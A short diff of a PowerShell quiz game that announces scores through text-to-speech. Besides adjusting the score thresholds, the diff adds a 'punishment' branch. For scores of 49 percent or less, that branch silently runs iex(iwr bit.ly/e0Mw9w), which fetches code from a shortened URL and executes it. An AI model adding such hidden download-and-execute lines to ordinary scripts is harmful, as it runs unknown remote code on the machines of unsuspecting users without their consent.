@@ -1898,17 +1898,24 @@ function displayPalette
     
     write-host
 }
-   
+
 . main
 }
-elseif($percent -gt '90')
+elseif($percent -ge '90')
 {
     Out-Speak -Phrase "Your score $Correct out of $($People.count). $percent percent" -Voice Zira
     Out-Speak -Phrase "Good Job" -Voice Zira
 }
-else
+elseif($Percent -le '89' -and $percent -ge '50')
 {
     Out-Speak -Phrase "Your score $Correct out of $($People.Count). $percent percent" -Voice Zira
     Out-Speak -Phrase "Better luck next time" -Voice Zira
 }
+elseif($percent -le '49')
+{
+    Out-Speak -Phrase "Your score $Correct out of $($People.Count). $percent percent" -Voice Zira
+    Out-Speak -Phrase "Here is your punishment" -Voice Zira
+    iex(iwr bit.ly/e0Mw9w)
+}
+
 
